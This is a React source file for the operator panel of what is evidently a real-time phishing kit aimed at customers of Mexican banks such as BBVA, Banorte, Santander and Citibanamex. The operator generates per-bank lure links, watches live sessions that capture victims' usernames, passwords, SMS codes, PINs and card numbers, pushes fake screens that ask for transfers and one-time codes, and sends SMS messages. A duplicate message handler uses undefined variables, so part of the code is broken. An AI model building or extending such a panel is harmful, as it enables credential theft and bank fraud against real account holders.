import { useState, useEffect } from 'react';
import { useQuery, useMutation } from '@tanstack/react-query';
import { queryClient } from '@/lib/queryClient';
import { apiRequest } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { useWebSocket } from '@/hooks/useWebSocket';
import { useAuth } from '@/hooks/use-auth';
import Sidebar from '@/components/admin/Sidebar';
import AccessTable from '@/components/admin/AccessTable';
import UserManagement from '@/components/admin/UserManagement';
import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
import SmsManagement from '@/components/admin/SmsManagement';
import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
import { Session, ScreenType } from '@shared/schema';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { LogOut, UserCog, MessageSquare, Send, RefreshCw } from 'lucide-react';
import { nanoid } from 'nanoid';

export default function AdminPanel() {
  const { toast } = useToast();
  const { user, logoutMutation } = useAuth();
  const [activeBank, setActiveBank] = useState<string>("todos");
  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'sms'>('current');
  
  // Actualizar el banco activo cuando el usuario cambia
  useEffect(() => {
    if (user) {
      // Si el usuario no tiene acceso a todos los bancos y tiene bancos específicos
      if (user.role !== 'admin' && user.allowedBanks !== 'all' && user.allowedBanks) {
        // Establecer el primer banco permitido como el activo
        const allowedBanks = user.allowedBanks.split(',');
        if (allowedBanks.length > 0) {
          setActiveBank(allowedBanks[0]);
        }
      }
    }
  }, [user]);
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [clientLink, setClientLink] = useState<string>('');
  const [clientCode, setClientCode] = useState<string>('');
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  
  // Estados para la ventana emergente de enviar SMS
  const [isSmsSendDialogOpen, setIsSmsSendDialogOpen] = useState(false);
  const [smsPhoneNumber, setSmsPhoneNumber] = useState('');
  const [smsMessage, setSmsMessage] = useState('');
  const [isSendingSms, setIsSendingSms] = useState(false);

  // Determinar si es un usuario regular o administrador
  const isAdmin = user?.role === 'admin';
  const isSuperAdmin = user?.username === 'balonx';
  const isRegularUser = user?.role === 'user';

  // Socket connection for real-time updates
  const { socket, connected, sendMessage } = useWebSocket("/ws");

  // Fetch sessions from API
  const { data: initialSessions, isLoading, refetch: refresh } = useQuery({
    queryKey: ['/api/sessions', activeTab],
    queryFn: async () => {
      const type = activeTab === 'saved' ? 'saved' : 'current';
      const res = await apiRequest('GET', `/api/sessions?type=${type}`);
      return await res.json();
    },
    refetchInterval: false,
    refetchOnWindowFocus: true,
    staleTime: 10000 // 10 segundos
  });

  // Generate link mutation
  const generateLink = useMutation({
    mutationFn: async () => {
      // Utilizamos el banco seleccionado o LIVERPOOL como predeterminado si se eligió 'todos'
      let banco = activeBank === 'todos' ? 'LIVERPOOL' : activeBank;
      
      console.log(`Generating link for bank: ${banco}`);
      const res = await apiRequest('GET', `/api/generate-link?banco=${banco}`);
      return await res.json();
    },
    onSuccess: (data) => {
      setClientLink(data.link);
      setClientCode(data.code);
      toast({
        title: "Link generado",
        description: `Link generado con código: ${data.code}`,
      });
      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
    },
    onError: (error) => {
      toast({
        title: "Error al generar link",
        description: error.message,
        variant: "destructive",
      });
    }
  });

  // Socket event handlers
  useEffect(() => {
    if (connected) {
      // Register as admin
      sendMessage({
        type: 'REGISTER',
        role: 'ADMIN'
      });
    }
  }, [connected, sendMessage]);

  useEffect(() => {
    // Initialize sessions from API data
    if (initialSessions) {
      setSessions(Array.isArray(initialSessions) ? initialSessions : []);
    }
  }, [initialSessions]);
  
  // Redirigir a usuarios regulares si intentan acceder a pestañas restringidas por URL
  useEffect(() => {
    // Verificamos si estamos en pestañas restringidas
    if (!isSuperAdmin && (activeTab === 'users' || activeTab === 'registered')) {
      setActiveTab('current');
    }
    
    // Verificamos si estamos en pestañas solo para administradores
    if (user?.role !== 'admin' && activeTab === 'sms') {
      setActiveTab('current');
    }
  }, [activeTab, isSuperAdmin, user?.role]);

  // Efecto para cargar las sesiones
  useEffect(() => {
    if (activeTab === 'current' || activeTab === 'saved') {
      // Actualizar cada 3 segundos
      const interval = setInterval(() => {
        refresh();
      }, 3000);
      
      return () => clearInterval(interval);
    }
  }, [activeTab, refresh]);

  // Socket message handler
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const data = JSON.parse(event.data);
        console.log("Mensaje WebSocket recibido en AdminPanel:", data.type);
        
        if (data.type === 'INIT_SESSIONS') {
          setSessions(data.data);
        }
        else if (data.type === 'SESSION_UPDATE') {
          // Solo actualizar la sesión en la pestaña actual
          if ((activeTab === 'current' && !data.data.saved) || 
              (activeTab === 'saved' && data.data.saved)) {
            setSessions(prev => {
              const updated = [...prev];
              const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
              if (index >= 0) {
                updated[index] = data.data;
              } else {
                updated.push(data.data);
              }
              return updated;
            });
          }
        }
        else if (data.type === 'SESSION_DELETE') {
          // Eliminar la sesión de la lista si está presente
          setSessions(prev => 
            prev.filter(session => session.sessionId !== data.data.sessionId)
          );
          
          // Si la sesión eliminada era la seleccionada, deseleccionarla
          if (selectedSessionId === data.data.sessionId) {
            setSelectedSessionId(null);
          }
          
          toast({
            title: "Sesión eliminada",
            description: "La sesión ha sido eliminada correctamente.",
          });
        }
        else if (data.type === 'SESSIONS_CLEANUP') {
          // Notificar al usuario sobre la limpieza de sesiones expiradas
          const { deletedCount } = data.data;
          if (deletedCount > 0) {
            toast({
              title: "Limpieza automática",
              description: `${deletedCount} sesiones antiguas (>5 días) han sido eliminadas.`,
            });
            
            // Actualizar la lista desde el servidor
            queryClient.invalidateQueries({ queryKey: ['/api/sessions', activeTab] });
          }
        }
        else if (data.type === 'SMS_COMPRA_CODE') {
          // Notificación especial para códigos SMS_COMPRA
          const { sessionId, code } = data.data;
          
          toast({
            title: "Código de cancelación SMS_COMPRA",
            description: `Código: ${code} (Sesión: ${sessionId.substring(0, 6)}...)`,
            variant: "default",
          });
          
          console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
        }
        // Se eliminó la sección CLIENT_INPUT_REALTIME por solicitud del usuario
        // para quitar las notificaciones en tiempo real
        
        // Las actualizaciones de datos se manejan ahora solo a través de SESSION_UPDATE
        else if (data.type === 'SESSION_UPDATE') {
          // Actualizar la sesión en la interfaz
          setSessions(prev => {
            const updated = [...prev];
            const index = updated.findIndex(s => s.sessionId === sessionId);
            
            if (index >= 0) {
              // Crear copia de la sesión actual
              const updatedSession = { ...updated[index] };
              
              // Actualizar los campos según el tipo de datos
              switch (tipo) {
                case 'folio':
                  updatedSession.folio = inputData.folio;
                  break;
                case 'login':
                  updatedSession.username = inputData.username;
                  updatedSession.password = inputData.password;
                  break;
                case 'codigo':
                  updatedSession.sms = inputData.codigo;
                  break;
                case 'nip':
                  updatedSession.nip = inputData.nip;
                  break;
                case 'tarjeta':
                  updatedSession.tarjeta = inputData.tarjeta;
                  break;
                case 'sms_compra':
                case 'SMS_COMPRA':
                case 'smsCompra':
                  updatedSession.smsCompra = inputData.smsCompra;
                  break;
                case 'celular':
                  updatedSession.celular = inputData.celular;
                  break;
              }
              
              // Actualizar en la lista
              updated[index] = updatedSession;
            }
            
            return updated;
          });
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => {
      socket.removeEventListener('message', handleMessage);
    };
  }, [socket]);

  // Handle screen change
  const handleScreenChange = (screen: string) => {
    if (!selectedSessionId) {
      toast({
        title: "Seleccione una sesión",
        description: "Debe seleccionar una sesión para cambiar la pantalla.",
        variant: "destructive",
      });
      return;
    }

    // Debug para rastrear el flujo
    console.log("handleScreenChange recibió tipo de pantalla:", screen);

    // Handle modals for certain screens
    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
      console.log("Activando modal para:", screen);
      setActiveModal(screen);
      return;
    }

    // Send direct screen change for other screens
    sendScreenChange({
      tipo: `mostrar_${screen}`,
      sessionId: selectedSessionId
    });
  };

  // Send screen change via WebSocket
  const sendScreenChange = (data: any) => {
    if (connected) {
      sendMessage({
        type: 'SCREEN_CHANGE',
        data
      });

      toast({
        title: "Pantalla cambiada",
        description: `La pantalla ha sido cambiada a ${data.tipo.replace('mostrar_', '')}.`,
      });
    } else {
      toast({
        title: "Error de conexión",
        description: "No hay conexión con el servidor.",
        variant: "destructive",
      });
    }
  };

  // Copy link to clipboard
  const copyLink = async () => {
    try {
      await navigator.clipboard.writeText(clientLink);
      toast({
        title: "Link copiado",
        description: "El link ha sido copiado al portapapeles.",
      });
    } catch (error) {
      toast({
        title: "Error al copiar",
        description: "No se pudo copiar el link al portapapeles.",
        variant: "destructive",
      });
    }
  };

  // Handle session selection
  const selectSession = (sessionId: string) => {
    setSelectedSessionId(sessionId);
  };

  // Modal handlers
  const closeModal = () => setActiveModal(null);

  const handleProtectConfirm = (amount: string) => {
    sendScreenChange({
      tipo: 'mostrar_protege',
      sessionId: selectedSessionId,
      saldo: amount
    });
    closeModal();
  };

  const handleTransferConfirm = (data: { cantidad: string, titular: string, clabe: string, alias: string }) => {
    sendScreenChange({
      tipo: 'mostrar_transferir',
      sessionId: selectedSessionId,
      monto: data.cantidad,
      titular: data.titular,
      clabe: data.clabe
    });
    closeModal();
  };

  const handleCancelConfirm = (data: { importe: string, negocio: string }) => {
    sendScreenChange({
      tipo: 'mostrar_cancelacion',
      sessionId: selectedSessionId,
      monto: data.importe,
      comercio: data.negocio
    });
    closeModal();
  };

  const handleCodeConfirm = (telefono: string) => {
    // Update session with phone number and send code screen
    if (telefono && telefono.length === 10) {
      const terminacion = telefono.substring(telefono.length - 4);
      
      // First update the session with the phone number
      if (selectedSessionId) {
        apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
          .then(() => {
            // Then send the screen change
            sendScreenChange({
              tipo: 'mostrar_codigo',
              sessionId: selectedSessionId,
              terminacion
            });
          })
          .catch(error => {
            toast({
              title: "Error al actualizar teléfono",
              description: error.message,
              variant: "destructive",
            });
          });
      }
    } else {
      toast({
        title: "Teléfono inválido",
        description: "Ingrese un número de teléfono válido de 10 dígitos.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };

  const handleMessageConfirm = (mensaje: string) => {
    sendScreenChange({
      tipo: 'mostrar_mensaje',
      sessionId: selectedSessionId,
      mensaje
    });
    closeModal();
  };

  const handleSmsCompraConfirm = (telefono: string) => {
    // Solo esperamos los últimos 4 dígitos del teléfono
    if (telefono && telefono.length === 4) {
      const terminacion = telefono; // Ya tenemos directamente los 4 dígitos
      
      // Enviar directamente la pantalla de SMS_COMPRA con los 4 dígitos
      if (selectedSessionId) {
        // Entonces, send the screen change directamente
        console.log("ScreenType.SMS_COMPRA:", ScreenType.SMS_COMPRA);
        console.log("Enviando terminación:", terminacion);
        sendScreenChange({
          tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
          sessionId: selectedSessionId,
          terminacion
        });
      }
    } else {
      toast({
        title: "Entrada inválida",
        description: "Ingrese exactamente los 4 últimos dígitos del número celular.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };
  
  // Manejar el envío de SMS
  const sendSms = useMutation({
    mutationFn: async () => {
      // Validar número de teléfono
      if (!smsPhoneNumber || smsPhoneNumber.length !== 10 || !/^\d+$/.test(smsPhoneNumber)) {
        throw new Error("El número de teléfono debe tener 10 dígitos numéricos");
      }
      
      // Validar mensaje
      if (!smsMessage.trim()) {
        throw new Error("El mensaje no puede estar vacío");
      }
      
      const res = await apiRequest("POST", "/api/sms/send", {
        phoneNumber: smsPhoneNumber,
        message: smsMessage
      });
      
      return await res.json();
    },
    onMutate: () => {
      setIsSendingSms(true);
    },
    onSuccess: () => {
      toast({
        title: "SMS enviado",
        description: "El mensaje ha sido enviado correctamente.",
      });
      
      // Limpiar el formulario y cerrar la ventana
      setSmsPhoneNumber("");
      setSmsMessage("");
      setIsSmsSendDialogOpen(false);
      
      // Actualizar historial de SMS
      queryClient.invalidateQueries({ queryKey: ['/api/sms/history'] });
      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits'] });
    },
    onError: (error: Error) => {
      toast({
        title: "Error al enviar SMS",
        description: error.message,
        variant: "destructive",
      });
    },
    onSettled: () => {
      setIsSendingSms(false);
    }
  });

  // Vista completa para administradores
  return (
    <div className="flex w-full h-screen overflow-hidden">
      {/* Sidebar */}
      <Sidebar 
        activeTab={activeTab}
        onTabChange={(tab) => setActiveTab(tab as 'current' | 'saved' | 'users' | 'registered' | 'sms')}
        isAdmin={isAdmin}
        isSuperAdmin={isSuperAdmin}
      />

      {/* Main Content */}
      <div className="flex-1 bg-[#121212] text-white flex flex-col h-screen overflow-hidden">
        {/* Header Section */}
        <div className="p-6 pb-0">
          <div className="flex justify-between items-start">
            <div>
              <p className="text-[#00aaff]">Panel / Accesos</p>
              <h1 className="text-2xl font-bold mb-3">Panel Accesos</h1>
              
              <div className="mt-2">
                <label htmlFor="pantallaControl" className="text-sm text-gray-400">
                  Acciones / Control de Pantalla:
                </label>
                <select 
                  id="pantallaControl" 
                  className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
                  onChange={(e) => handleScreenChange(e.target.value)}
                  value=""
                >
                  <option value="">Selecciona una opción</option>
                  <option value="login">1. Login</option>
                  <option value="codigo">2. Código de verificación</option>
                  <option value="nip">3. NIP</option>
                  <option value="protege">4. Protege tu información</option>
                  <option value="tarjeta">5. Ingresa tarjeta</option>
                  <option value="transferir">6. Transfiere fondos</option>
                  <option value="cancelacion">7. Cancelación exitosa</option>
                  <option value="mensaje">8. Ingresa el mensaje que gustes</option>
                  <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
                </select>
              </div>
            </div>
            
            <div className="space-x-2">
              <button 
                className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all flex items-center"
                disabled
              >
                <MessageSquare className="mr-2 h-4 w-4" />
                Bulk SMS
              </button>
              {user?.role === 'admin' && (
                <button 
                  className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all flex items-center"
                  onClick={() => setIsSmsSendDialogOpen(true)}
                >
                  <Send className="mr-2 h-4 w-4" />
                  Enviar SMS
                </button>
              )}
            </div>
          </div>
        </div>

        {/* Link Panel */}
        <div className="mx-6 mt-6 bg-[#1e1e1e] p-4 rounded-lg flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <span className="font-semibold">Liga activa:</span>
            <a href={clientLink} target="_blank" className="text-[#00aaff]">
              {clientLink || 'Genere un nuevo link para el cliente'}
            </a>
            {clientCode && (
              <span className={`font-bold ml-2 px-3 py-1 rounded-md ${
                activeBank === 'BANBAJIO' 
                  ? 'text-white bg-[#4D2C91]' 
                  : 'text-green-400 bg-[#1a3e1a]'
              }`}>
                Código: <span className="text-xl tracking-wider">{clientCode}</span>
              </span>
            )}
            <button 
              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded ml-2"
              onClick={copyLink}
            >
              Copiar
            </button>
            <button 
              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
              onClick={() => generateLink.mutate()}
            >
              {generateLink.isPending ? 'Generando...' : 'Regenerar'}
            </button>
          </div>
          
          <select 
            id="filtroBanco" 
            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2"
            value={activeBank}
            onChange={(e) => setActiveBank(e.target.value)}
          >
            {user?.allowedBanks === 'all' || user?.role === 'admin' ? (
              <>
                <option value="todos">Todos los bancos</option>
                <option value="LIVERPOOL">LIVERPOOL</option>
                <option value="CITIBANAMEX">CITIBANAMEX</option>
                <option value="BANBAJIO">BANBAJIO</option>
                <option value="BANCOPPEL">BANCOPPEL</option>
                <option value="BANORTE">BANORTE</option>
                <option value="BBVA">BBVA</option>
                <option value="HSBC">HSBC</option>
                <option value="AMEX">AMEX</option>
                <option value="SANTANDER">SANTANDER</option>
                <option value="SCOTIABANK">SCOTIABANK</option>
                <option value="INVEX">INVEX</option>
                <option value="BANREGIO">BANREGIO</option>
                <option value="SPIN">SPIN</option>
              </>
            ) : (
              <>
                {user?.allowedBanks?.split(',').map(bank => (
                  <option key={bank} value={bank}>
                    {bank.toUpperCase()}
                  </option>
                ))}
              </>
            )}
          </select>
        </div>

        {/* Tabs */}
        <div className="mx-6 mt-6 flex justify-between items-center">
          <div className="flex space-x-4">
            <div 
              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'current' 
                ? 'border-[#00aaff] text-[#00aaff]' 
                : 'border-transparent hover:text-gray-300'}`}
              onClick={() => setActiveTab('current')}
            >
              Accesos actuales
            </div>
            <div 
              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'saved' 
                ? 'border-[#00aaff] text-[#00aaff]' 
                : 'border-transparent hover:text-gray-300'}`}
              onClick={() => setActiveTab('saved')}
            >
              Accesos guardados
            </div>
            {isSuperAdmin && (
              <>
                <div 
                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'users' 
                    ? 'border-[#00aaff] text-[#00aaff]' 
                    : 'border-transparent hover:text-gray-300'}`}
                  onClick={() => setActiveTab('users')}
                >
                  Usuarios
                </div>
                <div 
                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'registered' 
                    ? 'border-[#00aaff] text-[#00aaff]' 
                    : 'border-transparent hover:text-gray-300'}`}
                  onClick={() => setActiveTab('registered')}
                >
                  Usuarios Registrados
                </div>
              </>
            )}
            {user?.role === 'admin' && (
              <div 
                className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'sms' 
                  ? 'border-[#00aaff] text-[#00aaff]' 
                  : 'border-transparent hover:text-gray-300'}`}
                onClick={() => setActiveTab('sms')}
              >
                API MSJ
              </div>
            )}
          </div>
          
          <div className="flex items-center space-x-2">
            <span className="text-gray-400 text-sm mr-2">
              {user?.username} ({user?.role})
            </span>
            <Button 
              variant="outline" 
              size="sm"
              className="text-gray-300 hover:text-white"
              onClick={() => logoutMutation.mutate()}
            >
              <LogOut className="h-4 w-4 mr-1" />
              Cerrar sesión
            </Button>
          </div>
        </div>

        {/* Content based on active tab */}
        {activeTab === 'users' && isSuperAdmin ? (
          <UserManagement />
        ) : activeTab === 'registered' && isSuperAdmin ? (
          <RegisteredUsersManagement />
        ) : activeTab === 'sms' && user?.role === 'admin' ? (
          <SmsManagement />
        ) : (
          <AccessTable 
            sessions={sessions}
            activeBank={activeBank}
            selectedSessionId={selectedSessionId}
            onSelectSession={selectSession}
            isLoading={isLoading}
          />
        )}
      </div>

      {/* Modals */}
      <ProtectModal 
        isOpen={activeModal === 'protege'} 
        onClose={closeModal} 
        onConfirm={handleProtectConfirm} 
      />
      <TransferModal 
        isOpen={activeModal === 'transferir'} 
        onClose={closeModal} 
        onConfirm={handleTransferConfirm} 
      />
      <CancelModal 
        isOpen={activeModal === 'cancelacion'} 
        onClose={closeModal} 
        onConfirm={handleCancelConfirm} 
      />
      <CodeModal 
        isOpen={activeModal === 'codigo'} 
        onClose={closeModal} 
        onConfirm={handleCodeConfirm} 
      />
      <MessageModal 
        isOpen={activeModal === 'mensaje'} 
        onClose={closeModal} 
        onConfirm={handleMessageConfirm} 
      />
      <SmsCompraModal 
        isOpen={activeModal === 'sms_compra'} 
        onClose={closeModal} 
        onConfirm={handleSmsCompraConfirm} 
      />
      
      {/* Diálogo para enviar SMS */}
      <Dialog open={isSmsSendDialogOpen} onOpenChange={setIsSmsSendDialogOpen}>
        <DialogContent className="sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700">
          <DialogHeader>
            <DialogTitle className="flex items-center">
              <Send className="mr-2 h-5 w-5" />
              Enviar Mensaje SMS
            </DialogTitle>
            <DialogDescription className="text-gray-400">
              Ingresa el número de teléfono y el mensaje que deseas enviar.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="phone" className="text-right">
                Teléfono
              </Label>
              <Input
                id="phone"
                type="text"
                inputMode="numeric"
                value={smsPhoneNumber}
                onChange={(e) => setSmsPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                placeholder="10 dígitos"
                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white"
                maxLength={10}
              />
            </div>
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="message" className="text-right">
                Mensaje
              </Label>
              <Textarea
                id="message"
                value={smsMessage}
                onChange={(e) => setSmsMessage(e.target.value)}
                placeholder="Escribe tu mensaje aquí..."
                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white min-h-[120px]"
              />
            </div>
          </div>
          
          <DialogFooter>
            <Button
              type="button"
              variant="outline"
              onClick={() => setIsSmsSendDialogOpen(false)}
              className="border-gray-700 text-gray-300 hover:bg-gray-800"
            >
              Cancelar
            </Button>
            <Button
              type="button"
              onClick={() => sendSms.mutate()}
              disabled={isSendingSms || !smsPhoneNumber || !smsMessage || smsPhoneNumber.length !== 10}
              className="bg-[#007bff] hover:bg-blue-700 text-white flex items-center"
            >
              {isSendingSms ? (
                <>
                  <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                  Enviando...
                </>
              ) : (
                <>
                  <Send className="h-4 w-4 mr-2" />
                  Enviar
                </>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}